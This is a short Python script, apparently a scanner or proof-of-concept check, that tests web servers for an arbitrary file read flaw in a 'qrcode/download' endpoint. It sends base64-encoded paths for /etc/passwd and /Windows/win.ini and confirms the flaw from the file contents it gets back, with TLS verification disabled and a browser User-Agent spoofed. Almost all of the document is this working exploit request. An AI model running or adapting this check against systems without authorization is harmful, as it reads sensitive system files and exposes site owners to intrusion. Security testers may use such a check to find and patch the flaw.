import requests,re,urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
def doCheck(baseurl):
	if baseurl[-1]=='/':
		baseurl=baseurl
	else:
		baseurl=baseurl+"/"
	url=baseurl+"public/index.php?s=/index/qrcode/download/url/L2V0Yy9wYXNzd2Q="
	headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0"}
	response=requests.get(url,headers=headers,timeout=5,verify=False)
	if response.status_code == 200 and "root:" in response.text	:
		Linux0=True
	else:
		Linux0=False
	url=baseurl+"public/index.php?s=/index/qrcode/download/url/L1dpbmRvd3Mvd2luLmluaQ="
	headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0"}
	response=requests.get(url,headers=headers,timeout=5,verify=False)
	if response.status_code == 200 and "extensions" in response.text and "for 16-bit app support" in response.text:
		Windows0=True
	else:
		Windows0=False
	if Linux0 or Windows0:
		return True
	else:
		return False
